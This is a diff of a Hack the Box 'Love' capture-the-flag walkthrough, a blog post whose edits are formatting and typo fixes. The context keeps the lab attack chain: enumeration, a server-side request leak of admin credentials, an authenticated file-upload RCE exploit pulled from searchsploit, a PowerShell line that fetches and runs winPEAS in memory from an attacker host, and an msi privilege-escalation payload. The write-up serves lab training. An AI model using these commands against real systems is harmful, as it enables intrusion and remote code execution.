@@ -10,6 +10,7 @@ cover: ./assets/2021-08-09-hack-the-box-love/cover.png
 In this post, I walk you through Love from Hack the Box, an easy Windows box where good enumeration is the key to success. The box contains a bunch of open ports, the main interesting ones serving HTTP are 80, 443 and 5000. This last one gives access denied, but on ports 80 and 443 you will find a voting system secured by a login prompt. Via the certificate on port 443 you can leak some extra domains that give access to a tool that contains a CSRF that allows you to access services on localhost. This way, you get access to the service running on port 5000, which has admin credentials that grant access to the voting system. Once in the voting system, we can leverage a known CVE to upload a malicious payload and get a reverse shell on the box. On the box, you then execute an `msi` to get root. With all that said, let's dive right in and start our port scan enumeration.
 
 ## Enumeration
+
 We are starting our investigation with a nmap scan. This allows getting a better overview of what is exposed on the target machine. We'll use `-sV` to enumerate versions, `-sC` to run all default scripts, and store the output in a file named `nmap.txt`. This way, we can always refer back to it later. This machine contains a fair few of open ports, hence why the scan might take some time. Add `-v` as a parameter if you want nmap to show open ports while it finds them.
 
 ```sh
@@ -78,6 +79,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 There is lots of good stuff in this output. A few things to note are the open ports 80, 443 and 5000 serving some HTTP applications. Digging a bit deeper into the result for these ports, we can see the certificate and service info leaking the following domains for us:
+
 - www.love.htb
 - staging.love.htb
 
@@ -140,9 +142,10 @@ But we can see that this tool is actually sending out HTTP requests. We could se
 
 ![Leaked Admin Credentials](./assets/2021-08-09-hack-the-box-love/file-uploader-admin-creds.png)
 
-
 ## Foothold
+
 We got a set of credentials that we can use to log into the Voting System application. If you look at the results from the `gobuster` scan we kicked off earlier. You will see a `/admin` path. Let's open that page and see if these credentials work:
+
 - **Username**: admin
 - **Password**: @LoveIsInTheAir!!!!
 
@@ -163,7 +166,7 @@ Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)       
 Shellcodes: No Results
 ```
 
-The last one looks interesting: `Voting System 1.0 - File Upload RCE`  and get a copy of the script into a local folder:
+The last one looks interesting: `Voting System 1.0 - File Upload RCE` and get a copy of the script into a local folder:
 
 ```sh
 $  hack searchsploit -m 49445
@@ -177,7 +180,6 @@ Copied to: /home/nickvd/HTB/Love/hack/49445.py
 ```
 
 As is, the script doesn't work, so we'll need to make a couple of changes. First, we'll need to add the correct URL, username, and password in the settings area. Besides that, we'll also need to change the hardcoded URL's. The script assumes that the whole app is running behind `/votesystem`, but in our case everything is hosted behind `/`:
-
 
 ```diff
  import requests
@@ -229,7 +231,8 @@ Mode                 LastWriteTime         Length Name
 ```
 
 ## Lateral Movement
-To fingerprint the system and get an idea of our next steps lets run [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). After cloning the repo to your local machine navigate to the directory containing  `winPEASany.exe` and start a Python web server with  `python m http.server`. This way we can with `PowerShell` easily download and directly execute this binary:
+
+To fingerprint the system and get an idea of our next steps lets run [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). After cloning the repo to your local machine navigate to the directory containing `winPEASany.exe` and start a Python web server with `python m http.server`. This way we can with `PowerShell` easily download and directly execute this binary:
 
 ```powershell
 PS C:\xampp\htdocs\omrs\images> $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://10.10.14.28:8000/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
@@ -258,9 +261,9 @@ Payload size: 324 bytes
 Final size of msi file: 159744 bytes
 ```
 
-You can see it generated a 32-bit payload. On this machine, the payload type isn't all too important. Windows has a thing called `WoW` or Windows on Windows, allowing us to easily execute 32-bit binaries on a 64-bit system. If you ever bumped into Windows Core or Windows IOT, then `WoW` will most likely not be present.. In that scenario, it will be important you create the correct payload. 
+You can see it generated a 32-bit payload. On this machine, the payload type isn't all too important. Windows has a thing called `WoW` or Windows on Windows, allowing us to easily execute 32-bit binaries on a 64-bit system. If you ever bumped into Windows Core or Windows IOT, then `WoW` will most likely not be present.. In that scenario, it will be important you create the correct payload.
 
-From the directory where you created the `msi` installer, launch another web server with python se can easily drop the installer on the box:
+From the directory where you created the `msi` installer, launch another web server with python so can easily drop the installer on the box:
 
 ![NT System Shell](./assets/2021-08-09-hack-the-box-love/nt-system-shell.png)
 
